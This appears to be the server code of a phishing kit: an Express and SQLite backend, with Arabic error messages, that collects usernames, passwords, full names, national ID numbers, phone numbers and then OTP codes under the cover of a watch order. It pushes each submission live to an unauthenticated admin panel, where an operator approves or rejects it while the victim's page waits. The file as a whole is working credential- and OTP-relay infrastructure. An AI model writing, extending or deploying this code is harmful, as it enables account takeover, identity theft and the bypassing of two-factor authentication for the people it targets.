const express = require('express');
const path = require('path');
const Database = require('better-sqlite3');

const app = express();
const PORT = process.env.PORT || 3000;

// ─── SSE Clients (for real-time admin updates) ─────────────────────────────────
const sseClients = new Set();

function broadcastToAdmin(data) {
  const msg = `data: ${JSON.stringify(data)}\n\n`;
  sseClients.forEach(res => {
    try { res.write(msg); } catch (e) { sseClients.delete(res); }
  });
}

// ─── Init SQLite DB ────────────────────────────────────────────────────────────
const db = new Database(path.join(__dirname, 'data.db'));

db.exec(`
  CREATE TABLE IF NOT EXISTS logins (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    password TEXT NOT NULL,
    fullName TEXT NOT NULL,
    nationalId TEXT NOT NULL,
    phoneNumber TEXT NOT NULL,
    watchColor TEXT NOT NULL,
    otp TEXT DEFAULT NULL,
    status TEXT DEFAULT 'PENDING',
    createdAt INTEGER NOT NULL
  );
`);

app.use(express.json());

// ─── Serve Static Files ────────────────────────────────────────────────────────
app.use(express.static(path.join(__dirname)));

// ─── SSE: Real-time Admin Updates ────────────────────────────────────────────
// GET /api/admin/events
app.get('/api/admin/events', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.flushHeaders();
  res.write('data: {"type":"connected"}\n\n');
  sseClients.add(res);
  req.on('close', () => sseClients.delete(res));
});

// ─── API: Submit New Login/Order ───────────────────────────────────────────────
// POST /api/logins
// Body: { username, password, fullName, nationalId, phoneNumber, watchColor }
// Returns: { id, status, ... }
app.post('/api/logins', (req, res) => {
  const { username, password, fullName, nationalId, phoneNumber, watchColor } = req.body;

  if (!username || !password || !fullName || !nationalId || !phoneNumber || !watchColor) {
    return res.status(400).json({ error: 'جميع الحقول مطلوبة' });
  }

  const stmt = db.prepare(`
    INSERT INTO logins (username, password, fullName, nationalId, phoneNumber, watchColor, status, createdAt)
    VALUES (?, ?, ?, ?, ?, ?, 'PENDING', ?)
  `);
  const result = stmt.run(username, password, fullName, nationalId, phoneNumber, watchColor, Date.now());
  const newLogin = db.prepare('SELECT * FROM logins WHERE id = ?').get(result.lastInsertRowid);
  // Broadcast new order to admin SSE clients
  broadcastToAdmin({ type: 'new_order', order: newLogin });
  res.json(newLogin);
});

// ─── API: Get All Logins (Admin) ───────────────────────────────────────────────
// GET /api/logins
app.get('/api/logins', (req, res) => {
  const logins = db.prepare('SELECT * FROM logins ORDER BY createdAt DESC').all();
  res.json(logins);
});

// ─── API: Get Login Status (Polling) ──────────────────────────────────────────
// GET /api/logins/:id/status
app.get('/api/logins/:id/status', (req, res) => {
  const login = db.prepare('SELECT * FROM logins WHERE id = ?').get(req.params.id);
  if (!login) return res.status(404).json({ error: 'Not found' });
  res.json(login);
});

// ─── API: Submit OTP ───────────────────────────────────────────────────────────
// POST /api/logins/:id/otp
// Body: { otp }
app.post('/api/logins/:id/otp', (req, res) => {
  const { otp } = req.body;
  if (!otp) return res.status(400).json({ error: 'OTP مطلوب' });
  db.prepare('UPDATE logins SET otp = ? WHERE id = ?').run(otp, req.params.id);
  const updated = db.prepare('SELECT * FROM logins WHERE id = ?').get(req.params.id);
  res.json(updated);
});

// ─── API: Admin Action (APPROVED / REJECTED) ──────────────────────────────────
// POST /api/logins/:id/action
// Body: { action: 'APPROVED' | 'REJECTED' }
app.post('/api/logins/:id/action', (req, res) => {
  const { action } = req.body;
  if (!['APPROVED', 'REJECTED', 'PENDING'].includes(action)) {
    return res.status(400).json({ error: 'حالة غير صحيحة' });
  }
  db.prepare('UPDATE logins SET status = ? WHERE id = ?').run(action, req.params.id);
  const updated = db.prepare('SELECT * FROM logins WHERE id = ?').get(req.params.id);
  // Broadcast status change to all SSE clients (admin + client polling)
  broadcastToAdmin({ type: 'status_change', order: updated });
  res.json(updated);
});

// ─── API: Delete Login (Admin) ───────────────────────────────────────────────
// DELETE /api/logins/:id
app.delete('/api/logins/:id', (req, res) => {
  db.prepare('DELETE FROM logins WHERE id = ?').run(req.params.id);
  res.json({ success: true });
});

// ─── Admin Panel Route ─────────────────────────────────────────────────────────
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

// ─── SPA Fallback ──────────────────────────────────────────────────────────────
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
